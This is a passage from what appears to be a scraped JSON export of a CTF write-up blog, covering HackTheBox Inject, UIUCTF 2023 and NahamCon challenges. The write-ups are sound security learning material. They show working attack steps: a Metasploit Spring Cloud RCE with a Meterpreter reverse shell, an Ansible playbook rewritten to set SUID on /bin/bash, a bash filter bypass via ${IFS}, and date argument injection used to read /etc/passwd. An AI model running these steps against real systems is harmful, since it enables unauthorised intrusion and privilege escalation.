\u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-maven-plugin\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;${parent.version}\u0026lt;/version\u0026gt; \u0026lt;/plugin\u0026gt; \u0026lt;/plugins\u0026gt; \u0026lt;finalName\u0026gt;spring-webapp\u0026lt;/finalName\u0026gt; \u0026lt;/build\u0026gt; \u0026lt;/project\u0026gt; Here we can see the dependencies this webapp is built on. After exploring some potential vulnerabilities from the plugins listed, I eventually find a relevant exploit in spring boot cloud Using metasploit module to exploit:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 msf6 \u0026gt; search spring cloud Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 auxiliary/scanner/http/springcloud_directory_traversal 2020-06-01 normal No Directory Traversal in Spring Cloud Config Server 1 auxiliary/scanner/http/springcloud_traversal 2019-04-17 normal No Spring Cloud Config Server Directory Traversal 2 exploit/multi/http/spring_cloud_function_spel_injection 2022-03-29 excellent Yes Spring Cloud Function SpEL Injection 3 exploit/linux/http/spring_cloud_gateway_rce 2022-01-26 excellent Yes Spring Cloud Gateway Remote Code Execution Interact with a module by name or index. For example info 3, use 3 or use exploit/linux/http/spring_cloud_gateway_rce msf6 \u0026gt; use 2 [*] No payload configured, defaulting to linux/x64/meterpreter/reverse_tcp msf6 exploit(multi/http/spring_cloud_function_spel_injection) \u0026gt; For this exploit we only need to set our attacker host as LHOST and the target host as RHOST. The default port, 8080, is conveniently the port used on this inject box.\nAfter setting options in msfconsole, we get a shell as user frank.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 msf6 exploit(multi/http/spring_cloud_function_spel_injection) \u0026gt; run [*] Started reverse TCP handler on 10.10.14.167:4444 [*] Running automatic check (\u0026#34;set AutoCheck false\u0026#34; to disable) [!] The service is running, but could not be validated. [*] Executing Linux Dropper for linux/x64/meterpreter/reverse_tcp [*] Sending stage (3045348 bytes) to 10.10.11.204 [*] Command Stager progress - 100.00% done (823/823 bytes) [*] Meterpreter session 1 opened (10.10.14.167:4444 -\u0026gt; 10.10.11.204:33702) at 2023-07-04 17:01:12 -0400 meterpreter \u0026gt; shell Process 57134 created. Channel 1 created. whoami frank Now that we are in, we can try phil\u0026rsquo;s password again:\n1 2 3 4 su phil Password: DocPhillovestoInject123 whoami phil From here we can grab user.txt in phil\u0026rsquo;s home directory.\nPrivilege Escalation Enumeration Checking phil\u0026rsquo;s id, we see he is in multiple groups:\n1 2 id uid=1001(phil) gid=1001(phil) groups=1001(phil),50(staff) Looking for things owned by this group:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 find / -group \u0026#34;staff\u0026#34; 2\u0026gt;/dev/null /opt/automation/tasks /root /var/local /usr/local/lib/python3.8 /usr/local/lib/python3.8/dist-packages /usr/local/lib/python3.8/dist-packages/ansible_parallel.py /usr/local/lib/python3.8/dist-packages/ansible_parallel-2021.1.22.dist-info /usr/local/lib/python3.8/dist-packages/ansible_parallel-2021.1.22.dist-info/LICENSE /usr/local/lib/python3.8/dist-packages/ansible_parallel-2021.1.22.dist-info/RECORD /usr/local/lib/python3.8/dist-packages/ansible_parallel-2021.1.22.dist-info/entry_points.txt /usr/local/lib/python3.8/dist-packages/ansible_parallel-2021.1.22.dist-info/WHEEL /usr/local/lib/python3.8/dist-packages/ansible_parallel-2021.1.22.dist-info/METADATA /usr/local/lib/python3.8/dist-packages/ansible_parallel-2021.1.22.dist-info/top_level.txt /usr/local/lib/python3.8/dist-packages/ansible_parallel-2021.1.22.dist-info/INSTALLER /usr/local/lib/python3.8/dist-packages/__pycache__ /usr/local/lib/python3.8/dist-packages/__pycache__/ansible_parallel.cpython-38.pyc /usr/local/share/fonts /usr/local/share/fonts/.uuid It is strange to see the /root/ folder owned by staff. There is another folder owned by staff under /opt/autmoation/.\n1 2 3 4 5 ls -al /opt/automation/ total 12 drwxr-xr-x 3 root root 4096 Oct 20 2022 . drwxr-xr-x 3 root root 4096 Oct 20 2022 .. drwxrwxr-x 2 root staff 4096 Jul 4 21:16 tasks We can see the folder is group writable, and automation suggests these might be tasks automatically run by a user, perhaps root?\nBecoming root 1 2 3 4 5 6 7 8 9 10 ls playbook_1.yml cat playbook_1.yml - hosts: localhost tasks: - name: Checking webapp service ansible.builtin.systemd: name: webapp enabled: yes state: started We can see this is an ansible playbook, and ansible themselves have documentations on how one might elevate privileges for their playbooks. We might be able to invoke ansible as root, allowing us to execute any command specified in an ansible playbook. Rewriting the playbook contents, I have it designed to add SUID privileges to /bin/bash, allowing us to run a bash shell as root:\n1 2 3 4 5 - hosts: localhost tasks: - name: PrivEsc ansible.builtin.shell: cmd: \u0026#34;chmod u+s /bin/bash\u0026#34; After a few minutes, we can check the newly changed bash file, and become root:\n1 2 3 4 5 ls -al /bin/bash -rwsr-xr-x 1 root root 1183448 Apr 18 2022 /bin/bash /bin/bash -p whoami root Reflection Overall an interesting box, and an interesting spotlight to the power of ansible. The path to foothold was rather frustrating, the vulnerable plugin spring framework was deeply concealed. I spent a good deal of time exploring other potential vulnerabilities in spring boot that had seemed viable at the time.\n","date":"2023-07-08T09:04:19-05:00","image":"https://yuwenmichael.netlify.app/post/hackthebox-inject/Inject_hu12ac3957f7a126ac06ec9338f7d84355_333068_120x120_fill_box_smart1_3.png","permalink":"https://yuwenmichael.netlify.app/post/hackthebox-inject/","title":"HackTheBox - Inject"},{"content":"Misc Corny Kernel Use our corny little driver to mess with the Linux kernel at runtime!\nChecking the attached file:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 // SPDX-License-Identifier: GPL-2.0-only #define pr_fmt(fmt) KBUILD_MODNAME \u0026#34;: \u0026#34; fmt #include \u0026lt;linux/module.h\u0026gt; #include \u0026lt;linux/init.h\u0026gt; #include \u0026lt;linux/kernel.h\u0026gt; extern const char *flag1, *flag2; static int __init pwny_init(void) { pr_alert(\u0026#34;%s\\n\u0026#34;, flag1); return 0; } static void __exit pwny_exit(void) { pr_info(\u0026#34;%s\\n\u0026#34;, flag2); } module_init(pwny_init); module_exit(pwny_exit); MODULE_AUTHOR(\u0026#34;Nitya\u0026#34;); MODULE_DESCRIPTION(\u0026#34;UIUCTF23\u0026#34;); MODULE_LICENSE(\u0026#34;GPL\u0026#34;); MODULE_VERSION(\u0026#34;0.1\u0026#34;); We can see this module produces two flag parts, flag1 and flag2. One at init and one at exit. Entering the challenge terminal:\n1 2 3 4 5 6 7 8 9 10 11 $ socat file:$(tty),raw,echo=0 tcp:corny-kernel.chal.uiuc.tf:1337 == proof-of-work: disabled == + mount -n -t proc -o nosuid,noexec,nodev proc /proc/ + mkdir -p /dev /sys /etc + mount -n -t devtmpfs -o \u0026#39;mode=0755,nosuid,noexec\u0026#39; devtmpfs /dev + mount -n -t sysfs -o nosuid,noexec,nodev sys /sys + cd /root + exec setsid cttyhack ash -l /root # ls pwnymodule.ko.gz /root # We find a gzip file in cwd. Interestingly, file is not on this system but it is an irrelevant check. When we unzip we are left with .ko file, which is a kernel object. We can interact with this using modprobe or insmod.\n1 2 3 4 /root # insmod pwnymodule.ko [ 10.571676] pwnymodule: uiuctf{m4ster_ /root # rmmod pwnymodule.ko /root # Upon installing the module we see the first half of the flag. This makes sense considering module_init will produce the flag1 according to our source code. I thought that using rmmod to uninstall would produce the second half of the flag, but it did not go to terminal output.\nEventually I think to check dmesg:\n1 2 3 4 /root # dmesg \u0026lt;...SNIP...\u0026gt; [ 10.571676] pwnymodule: uiuctf{m4ster_ [ 112.877984] pwnymodule: k3rNE1_haCk3r} The difference seems to be primarily in that flag1 is produced with pr_alert() while flag2 is produced with pr_info(). Alert goes to stdout, while info goes to logs, perhaps?\nuiuctf{m4ster_k3rNE1_haCk3r}\nvimjail1 Connect with socat file:$(tty),raw,echo=0 tcp:vimjail1.chal.uiuc.tf:1337. You may need to install socat\nChecking the vimrc:\n1 2 3 4 5 6 7 8 $ cat vimrc set nocompatible set insertmode inoremap \u0026lt;c-o\u0026gt; nope inoremap \u0026lt;c-l\u0026gt; nope inoremap \u0026lt;c-z\u0026gt; nope inoremap \u0026lt;c-\\\u0026gt;\u0026lt;c-n\u0026gt; nope we can see the default is set to insert mode over normal mode. Additionally, several common escape keystrokes have been remapped to \u0026ldquo;nope\u0026rdquo;. However, looking carefully shows a small mistake. \u0026lt;c-\\\u0026gt;\u0026lt;c-n\u0026gt; has been mapped to \u0026ldquo;nope\u0026rdquo;, but these keystrokes individually have not. And so, we can still use \u0026lt;c-\\\u0026gt; to escape.\nUsing \u0026lt;c-\\\u0026gt; followed by \u0026lt;c-n\u0026gt;, we see insert mode has changed and we are able to supply : commands. Trying :shell,\n1 Shell commands and some functionality not allowed in rvim It looks like we cannot enter a regular shell being in rvim.. perhaps we can open a file named flag.txt?\n1 uiuctf{n0_3sc4p3_f0r_y0u_8613a322d0eb0628} It is worth noting that if you input \u0026lt;c-\\\u0026gt; followed by \u0026lt;c-n\u0026gt; too quickly, then you still get an error. There must be a somewhat large delay for this to work.\nvimjail2 Connect with socat file:$(tty),raw,echo=0 tcp:vimjail2.chal.uiuc.tf:1337. You may need to install socat\nChecking the vimrc, we see the same remaps as vimjail1. Plus some additional remaps:\n1 2 3 4 5 6 7 cnoremap a _ cnoremap b _ cnoremap c _ cnoremap d _ cnoremap e _ cnoremap f _ cnoremap g _ and so on. All special characters and lowercase letters are substituted with _, with the exception of lowercase q. When we enter normal mode through the same method as vimjail1, we find that we are unable to input any commands. However, exiting with :q produces the flag:\n1 2 3 E137: Viminfo file is not writable: /home/user/viminfo Press ENTER or type command to continue uiuctf{\u0026lt;left\u0026gt;\u0026lt;left\u0026gt;\u0026lt;left\u0026gt;\u0026lt;left\u0026gt;_c364201e0d86171b} It feels unintended, and based on the flag name, it looks like the intended solution involved sifting through something using left arrow keystrokes.\nOSINT The OSINT challenges involved a series of exercises related to one another. Though I did not personally solve all of them myself I will cover the related challenges solved by teammates as well.\nWhat\u0026rsquo;s for Dinner? Jonah Explorer, world renowned, recently landed in the city of Chicago, so you fly there to try and catch him. He was spotted at a joyful Italian restaurant in West Loop. You miss him narrowly but find out that he uses a well known social network and and loves documenting his travels and reviewing his food. Find his online profile.\nWith this prompt, we are informed of Jonah enjoying an italian dinner within a small subsection of Chicago. Given this information, I began sifting through all italian restaurants within that zone looking for a recent review or posting by our Jonah. After searching for hours, my fellow colleague managed to find a twitter account belonging to him. Surprisingly enough, Jonah had zero tweets announcing his dinner or even mentioning the place in Chicago. I still don\u0026rsquo;t know where he ate. His only tweet is one containing the flag. uiuctf{i_like_spaghetti}\nFinding Jonah? Jonah offered a reward to whoever can find out what hotel he is staying in. Based on the past information (chals), can you find out what the hotel he stayed at was? Flag should be uiuctf{hotel_name_inn}\nProvided image:\nWe can see two rather tall buildings, with the left one having more identifiable features in a curved top shape. Perusing the tallest buildings in chicago we can identify it fairly quickly as River Point, located at 444 West Lake Street. We know we are looking at a hotel, so from here we can try to guess the hotel location based on the angle of the building, and the relative sizes of the nearby buildings. Eventually we land on a successful guess of uiuctf{hampton_inn}. The inn can be found at this location\nJonah\u0026rsquo;s Journal After dinner, Jonah took notes into an online notebook and pushed his changes there. His usernames have been relatively consistent but what country is he going to next? Flag should be in format uiuctf{country_name}\nThis challenge is dependent on solving What's For Dinner?, as this one contains the key info of account username. There are several online notetaking services, but the language here is a strong suggestion on where it might be. It states that jonah \u0026ldquo;pushed his changes there\u0026rdquo;. The reference here is likely to a git push, which is the method to submit changes on git based services such as github. Searching here we can see right away, https://github.com/jonahexplorer. There is exactly 1 public repo on this account, and in it he states the following:\n1 2 3 storing all my adventure codes I think that the next place I wanna visit is the great wall of china, but not until I get off of flight UA5040 And so, we have our answer. uiuctf{china}.\nFirst class mail Jonah posted a picture online with random things on a table. Can you find out what zip code he is located in? Flag format should be uiuctf{zipcode}, ex: uiuctf{12345}.\nProvided image:\nThe image contains a lot of items, but only a couple stand out as interesting. The first being an insurance letter with the return address in plain sight. Trying uiuctf{16530} did not pass, so this address is not it. The other letter, however, has the mail address hidden but the mail barcode is shown in plain sight. Intelligent Mail Barcodes are used by the USPS to sort mail delivery quickly and easily. If we can decode this, we might be able to learn Jonah\u0026rsquo;s zip code. We can convert the barcode using this decoder key, then submitting it to an online decoder tool:\nDecoding our letter: FDFFDDFFDDDDFFDDDFFDDDDDFFDDDFFDDDFFDDFDFDDFFDDFDDFF\nUsing dcode.fr to decode:\nWe see the 9-digit zip as 606611234. This is known as ZIP+4, as the last 4 digits are extra specifiers to pinpoint a subsection within a regular ZIP address. The flag is only asking for the zip address with an example of 5 digits, so we submit the ZIP without the +4 appended: uiuctf{60661}.\n","date":"2023-07-03T11:37:04-05:00","permalink":"https://yuwenmichael.netlify.app/post/uiuctf_2023/","title":"UIUCTF_2023"},{"content":"Warmup Fast Hands Author: @JohnHammond#6971\nYou can capture the flag, but you gotta be fast!\nWe are given a button to Capture The Flag:\nClicking the button opens a new window that closes rather abruptly. The challenge prompt suggests we be quick, so I am thinking a curl request might be good since the contents do not close. Right clicking does not, however, allow me to copy a link url. I decided to see how this action is behaving when redirected through burp:\nInterception does indeed work great. We can see on click, we are redirected to /capture_the_flag.html.\nWhen we manually follow the link:\nIt\u0026rsquo;s another button, but doesn\u0026rsquo;t appear to be working too well. Viewing page source with Ctrl+U, we can see the flag within the code:\n1 2 3 4 5 6 7 8 9 10 11 \u0026lt;div class=\u0026#34;container p-5\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;text-center mt-5 p-5\u0026#34;\u0026gt; \u0026lt;button type=\u0026#34;button\u0026#34; onclick=\u0026#34;ctf()\u0026#34; class=\u0026#34;btn btn-success\u0026#34;\u0026gt;\u0026lt;h1\u0026gt;Your flag is:\u0026lt;br\u0026gt; \u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp; \u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp; \u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp; \u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp; \u0026lt;span style=\u0026#34;display:none\u0026#34;\u0026gt; flag{80176cdf1547a9be54862df3568966b8} \u0026lt;/span\u0026gt;\u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; flag{80176cdf1547a9be54862df3568966b8}\nAlternatively, we could have curled http://challenge.nahamcon.com:31565/capture_the_flag.html to achieve the same results.\n1 2 3 4 $ curl -s http://challenge.nahamcon.com:31565/capture_the_flag.html | grep flag \u0026lt;button type=\u0026#34;button\u0026#34; onclick=\u0026#34;ctf()\u0026#34; class=\u0026#34;btn btn-success\u0026#34;\u0026gt;\u0026lt;h1\u0026gt;Your flag is:\u0026lt;br\u0026gt; flag{80176cdf1547a9be54862df3568966b8} Glasses Author: @JohnHammond#6971\nEverything is blurry, I think I need glasses!\nVisiting the page gives us a very non-interactive page where we might buy glasses. Checking the source code with ctrl+U is an absolute mess. However, since everything I interact with does not take me anywhere new, I want to view html code on the page. Using right click to inspect has an interesting interaction:\nWhat\u0026rsquo;s even more interesting is this does nothing. I still get to inspect anyways.\nAfter leafing through the code a little bit, I do indeed find a piece that is interesting:\n1 2 3 4 5 6 \u0026lt;p class=\u0026#34;lead\u0026#34;\u0026gt; Can\u0026#39;t see things because they are too blurry? Is your vision foggy, and everything looks like \u0026lt;em\u0026gt;this?\u0026lt;/em\u0026gt; \u0026lt;span style=\u0026#34;color: transparent;text-shadow: 0 0 5px rgba(0,0,0,0.09);text-decoration: line-through;\u0026#34;\u0026gt;flag½₧8084e4530cf649814456f2a291eb81e9½―\u0026lt;/span\u0026gt; \u0026lt;br\u0026gt; Test your vision with glasses! Try on this pair and see if you can see the previous sample text... you might find a lot of value! Imagine the world where you can see clearly! Here is the same selection displayed on the webpage:\nThe color of our flag is transparent on top of white, and perhaps might be microscopically tiny as well. Either way, it is evident once we inspect the properties on the page. flag{8084e4530cf649814456f2a291eb81e9}\nRegina Author: @JohnHammond#6971\nI have a tyrannosaurus rex plushie and I named it Regina! Here, you can talk to it :)\nEntering the challenge, we are greeted with a banner:\n1 /usr/local/bin/regina: REXX-Regina_3.9.4(MT) 5.00 25 Oct 2021 (64 bit) A quick google search shows this is a rather popular interpreter that I have never heard of. It has a very thorough man page located here. However, no matter what my input is, I cannot seem to get a response. I learned the proper syntax that should work for testing purposes, but nothing connects back:\n1 2 3 4 /usr/local/bin/regina: REXX-Regina_3.9.4(MT) 5.00 25 Oct 2021 (64 bit) Say \u0026#34;Test\u0026#34; client_loop: send disconnect: Broken pipe After trying things for quite a while, right before giving up, I miraculously stumbled upon a response somehow:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 /usr/local/bin/regina: REXX-Regina_3.9.4(MT) 5.00 25 Oct 2021 (64 bit) \u0026#39;say test\u0026#39; ; run \u0026#39;say test\u0026#39;; Say \u0026#34;Test\u0026#34;; exec run ; go ^F mysh: say: not found ^Fmy my sh: RUN: not found sh: say: not found Test sh: EXEC: not found sh: RUN: not found Ssh: GO: not found Connection to challenge.nahamcon.com closed. While just enough to keep me from giving up, I had a lot of trouble recreating this still. While I had pressed ^F in the cli, I was under the impression that I also had pressed ^D and this keystroke was important for the execution. However, simply pressing ^D on its own ended up terminating the ssh connection.\nEventually I landed on a goofy pattern to execute, where I write my commands, quickly press the enter key two times, immediately followed by ^D, then another enter stroke. With this, my commands would be executed and then the connection terminated.\n1 2 3 4 5 6 7 8 9 /usr/local/bin/regina: REXX-Regina_3.9.4(MT) 5.00 25 Oct 2021 (64 bit) ADDRESS SYSTEM \u0026#34;ls\u0026#34; Say \u0026#34;Test\u0026#34; flag.txt Test Connection to challenge.nahamcon.com closed. 1 2 3 4 5 6 7 8 9 10 /usr/local/bin/regina: REXX-Regina_3.9.4(MT) 5.00 25 Oct 2021 (64 bit) ADDRESS SYSTEM \u0026#34;cat flag.txt\u0026#34; Say \u0026#34;Test\u0026#34; flag{2459b9ae7c704979948318cd2f47dfd6} Test Connection to challenge.nahamcon.com closed. CTRL+D is commonly used for exiting programs, so it is somewhat sensible that it finalizes REXX-Regina for execution. Was this intended, though? It certainly felt like a strange way to interact.\nMisc Goose Chase Author: @JohnHammond#6971\nI am truly sorry. I really do apologize\u0026hellip; I hope you can bear with me as I set you all loose together, on a communal collaboriative wild goose chase.\nWithin the google sheet, we see a hidden sheet if we check the bottom left:\nIt seems there is no way to view this as long as it is owned by somebody else, but it is possible to clone it into my own google sheet:\nUnder our copied version, we can make the hidden sheet viewable. Within the hidden sheet seems to be a formula importing from another sheet, only viewable after turning on formulas (View -\u0026gt; Show -\u0026gt; Formulas).\nFollowing this page again looks like an empty sheet. Just to be sure, i exported the sheet to a csv. Without editing the saved file, I learned that the flag was present in the file name:\n1 Goose Chase - Google Sheets - ... - Google Sheets - ... flag{323264294cc2a4ebb2c8d5f9e0afb0f7} - Google Sheets - Goose Chase.csv It isn\u0026rsquo;t obvious until I had exported, but it appears the flag was buried deep within the title name of the second sheet project. This can be verified using browser view, the flag is also present on hovering over the window:\nflag{323264294cc2a4ebb2c8d5f9e0afb0f7}\nOne Zero Author: @JohnHammond#6971\nYou only get one zero. ;)\nNOTE, This solution utilizes an unintended interaction.\nWe are given a file to see the restrictions placed. Once we are ready to give it a try, we ssh to their designated port.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 shopt -s extdebug function one_zero() { if [[ \u0026#34;$BASH_COMMAND\u0026#34; =~ ^[\\$\\\u0026amp;+:\\;=\\?@\\#|\\\u0026lt;\\\u0026gt;.\\^\\*()\\%\\!0-]+ ]]; then num_zero=$(awk \u0026#39;{print gsub(/0/, \u0026#34;\u0026#34;)}\u0026#39; \u0026lt;\u0026lt;\u0026lt; \u0026#34;$BASH_COMMAND\u0026#34;) if [[ $num_zero -le 1 ]]; then return; else echo \u0026#34;You are only allowed one zero. :)\u0026#34; return 1; fi fi echo \u0026#34;Sorry, you used a character that is not in the allowlist!\u0026#34; return 1; } trap \u0026#39;one_zero\u0026#39; DEBUG We can see there is a very strict character on the allowlist, but also that more than 1 zero and we trip the 2nd if statement, telling us only 1 zero allowed.\nJumping right in I learned that we can still pass env variables:\n1 2 3 4 user@one_zero:~$ $TERM bash: xterm-256color: command not found user@one_zero:~$ $HOME bash: /home/user: Is a directory In these cases, I don\u0026rsquo;t even need my precious zero! But what to do with them? The answer is not so clear. Next I found that I can append letter characters after a zero, and I still bypass the allowlist:\n1 2 user@one_zero:~$ 0whoami bash: 0whoami: command not found So far nothing is workable. After attempting some other additional operators:\n1 2 3 user@one_zero:~$ 0||whoami bash: 0: command not found Sorry, you used a character that is not in the allowlist! My operators are not exactly blacklisted, but being 2 separate commands still goes through the allowlist check, which my whoami inevitably fails.\nI know the bash special variable $IFS is known to be rather effective at bypassing some tricky filter settings, so I decided to try it out here and see what happens:\n1 2 3 4 user@one_zero:~$ ${IFS}whoami user user@one_zero:~$ ${IFS}ls flag.txt In an unexpected twist, it appears using $IFS at the start of the command results in any subsequent input bypassing the filter! From here it\u0026rsquo;s a simple cat away:\n1 2 user@one_zero:~$ ${IFS}cat flag.txt flag{81b9de37f5bd218c9f59ac2d9d709bf6} Wordle Bash Author: @JohnHammond#6971\nWe put a new novel spin on the old classic game of Wordle! Now it\u0026rsquo;s written in bash! :D\nOh, and you aren\u0026rsquo;t guessing words, this time\u0026hellip;\nUpon ssh, we find the wordle challenge. It\u0026rsquo;s umpiled shell code, so firstly let\u0026rsquo;s take a look:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 #!/bin/bash YEARS=(\u0026#34;2020\u0026#34; \u0026#34;2021\u0026#34; \u0026#34;2022\u0026#34; \u0026#34;2023\u0026#34; \u0026#34;2024\u0026#34; \u0026#34;2025\u0026#34;) MONTHS=(\u0026#34;01\u0026#34; \u0026#34;02\u0026#34; \u0026#34;03\u0026#34; \u0026#34;04\u0026#34; \u0026#34;05\u0026#34; \u0026#34;06\u0026#34; \u0026#34;07\u0026#34; \u0026#34;08\u0026#34; \u0026#34;09\u0026#34; \u0026#34;10\u0026#34; \u0026#34;11\u0026#34; \u0026#34;12\u0026#34; ) DAYS=(\u0026#34;01\u0026#34; \u0026#34;02\u0026#34; \u0026#34;03\u0026#34; \u0026#34;04\u0026#34; \u0026#34;05\u0026#34; \u0026#34;06\u0026#34; \u0026#34;07\u0026#34; \u0026#34;08\u0026#34; \u0026#34;09\u0026#34; \u0026#34;10\u0026#34; \u0026#34;11\u0026#34; \u0026#34;12\u0026#34; \u0026#34;13\u0026#34; \u0026#34;14\u0026#34; \u0026#34;15\u0026#34; \u0026#34;16\u0026#34; \u0026#34;17\u0026#34; \u0026#34;18\u0026#34; \u0026#34;19\u0026#34; \u0026#34;20\u0026#34; \u0026#34;21\u0026#34; \u0026#34;22\u0026#34; \u0026#34;23\u0026#34; \u0026#34;24\u0026#34; \u0026#34;25\u0026#34; \u0026#34;26\u0026#34; \u0026#34;27\u0026#34; \u0026#34;28\u0026#34; \u0026#34;29\u0026#34; \u0026#34;30\u0026#34; \u0026#34;31\u0026#34;) YEARS_SIZE=${#YEARS[@]} YEARS_INDEX=$(($RANDOM % $YEARS_SIZE)) YEAR=${YEARS[$YEARS_INDEX]} MONTHS_SIZE=${#MONTHS[@]} MONTHS_INDEX=$(($RANDOM % $MONTHS_SIZE)) MONTH=${MONTHS[$MONTHS_INDEX]} DAYS_SIZE=${#DAYS[@]} DAYS_INDEX=$(($RANDOM % $DAYS_SIZE)) DAY=${DAYS[$DAYS_INDEX]} TARGET_DATE=\u0026#34;${YEAR}-${MONTH}-${DAY}\u0026#34; gum style \\ --foreground 212 --border-foreground 212 --border double \\ --align center --width 50 --margin \u0026#34;1 2\u0026#34; --padding \u0026#34;2 4\u0026#34; \\ \u0026#39;WORDLE DATE\u0026#39; \u0026#39;Uncover the correct date!\u0026#39; echo \u0026#34;We\u0026#39;ve selected a random date, and it\u0026#39;s up to you to guess it!\u0026#34; wordle_attempts=1 while [ $wordle_attempts -le 5 ] do echo \u0026#34;Attempt $wordle_attempts:\u0026#34; echo \u0026#34;Please select the year you think we\u0026#39;ve chosen:\u0026#34; chosen_year=$(gum choose ${YEARS[@]}) echo \u0026#34;Now, enter the month of your guess: \u0026#34; chosen_month=$(gum choose ${MONTHS[@]}) echo \u0026#34;Finally, enter the day of your guess: \u0026#34; chosen_day=$(gum choose ${DAYS[@]}) guess_date=\u0026#34;$chosen_year-$chosen_month-$chosen_day\u0026#34; if ! date -d $guess_date; then echo \u0026#34;Invalid date! Your guess must be a valid date in the format YYYY-MM-DD.\u0026#34; exit fi confirmed=1 while [ $confirmed -ne 0 ] do gum confirm \u0026#34;You\u0026#39;ve entered \u0026#39;$guess_date\u0026#39;. Is that right?\u0026#34; confirmed=$? if [[ $confirmed -eq 0 ]] then break fi echo \u0026#34;Please select the date you meant:\u0026#34; guess_date=$(gum input --placeholder $guess_date) done if [[ $(date $guess_date) == $(date -d $TARGET_DATE +%Y-%m-%d) ]]; then gum style \\ --foreground 212 --border-foreground 212 --border double \\ --align center --width 50 --margin \u0026#34;1 2\u0026#34; --padding \u0026#34;2 4\u0026#34; \\ \u0026#34;Congratulations, you\u0026#39;ve won! You correctly guessed the date!\u0026#34; \u0026#39;Your flag is:\u0026#39; $(cat /root/flag.txt) exit 0 else echo \u0026#34;Sorry, that wasn\u0026#39;t correct!\u0026#34; echo \u0026#34;=====================================\u0026#34; fi wordle_attempts=$((wordle_attempts+1)) done gum style \\ --foreground 212 --border-foreground 212 --border double \\ --align center --width 50 --margin \u0026#34;1 2\u0026#34; --padding \u0026#34;2 4\u0026#34; \\ \u0026#34;Sorry, you lost.\u0026#34; \u0026#34;The correct date was $TARGET_DATE.\u0026#34; We can see the dates are generated \u0026ldquo;randomly\u0026rdquo; upon launch, so my first thought is to run 2 instances simultaneously. If the dates can match up, then it will be an easy win:\n1 user@wordle:~$ ./wordle_bash.sh \u0026amp; ./wordle_bash.sh It works as expected, but I hadn\u0026rsquo;t considered that in order to see the flag it had to be run as sudo. A quick check on sudo privs shows me that I am indeed capable:\n1 2 3 4 user@wordle:~$ sudo -l \u0026lt;... SNIP ...\u0026gt; User user may run the following commands on wordle-bash-d18d8fe5e302e98a-89966b69d-lv5gw: (root) /home/user/wordle_bash.sh However, running 2 sudo instances became very problematic, as I am asked for password on every launch. If one sudo process is immediately sent to bg, it will fail to launch once i try to fg, since the password had not really been submitted.\nAfter spending too long on trying to run 2 processes simultaneously, I looked more thoroughly at the userinput we could control. I noticed that after selecting dates, you are asked confirmation. If you say no, you can supply your own input with interesting results:\n1 2 3 4 5 Please select the date you meant: You\u0026#39;ve entered \u0026#39;-d $TARGET_DATE +%Y-%m-%d\u0026#39;. Is that right? date: invalid date ‘$TARGET_DATE’ Sorry, that wasn\u0026#39;t correct! The date function seems to be recognizing the -d flag without issue? Perhaps we are able to provide our own arguments to execute.\nThe GTFObins site has a page for date; we might be able to utilize arbitrary read capabilities.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 Please select the date you meant: You\u0026#39;ve entered \u0026#39;-f /etc/passwd\u0026#39;. Is that right? date: invalid date ‘root:x:0:0:root:/root:/bin/bash’ date: invalid date ‘bin:x:1:1:bin:/bin:/sbin/nologin’ date: invalid date ‘daemon:x:2:2:daemon:/sbin:/sbin/nologin’ date: invalid date ‘adm:x:3:4:adm:/var/adm:/sbin/nologin’ date: invalid date ‘lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin’ date: invalid date ‘sync:x:5:0:sync:/sbin:/bin/sync’ date: invalid date 